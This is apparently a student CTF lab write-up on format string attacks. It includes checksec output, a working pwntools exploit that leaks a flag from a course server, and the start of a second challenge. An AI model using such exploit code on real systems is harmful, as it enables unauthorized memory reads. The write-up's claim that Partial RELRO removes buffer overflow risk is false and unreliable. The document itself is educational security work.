# Trabalho Realizado na Semana 5

## CTF

### Desafio 1

After executing `checksec` with `program`, the result was:

```bash
RELRO           STACK CANARY      NX            PIE            RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols     Yes	0		2	program
```
This program has **Partial RELRO**, meaning that there is no risk of a buffer overflow. Because there is a **stack canary**, stack smashing is mitigated (except by a leak or bruteforce). **NX** is enabled, therefore it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable. Since there is no **PIE**, **ROP** attacks aren't difficulted.

After some time exploring the source code, we found some important information about this executable:

```
- In the line 27, a user input is printed.
- We can read the value of the global variable using printf().
- The address of flag is 0x0804c060
```

We used the printf function to make a format string attack. The following python code was used to get the flag:

```py
#!/usr/bin/python3
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08"+b"%s")
p.interactive()

```

Flag:
```
flag{3a0f46cdeaa85626428c12879b84703f}
```

### Desafio 2

This challenge had some differences when comparing to the first one:

```
- In the line 14, a user input is printed and we can modify the value in memory.
- The system call is used to retrieve the flag.
- We have to alter the key value, mapped in 0x0804c034, to 0xbeef.
```
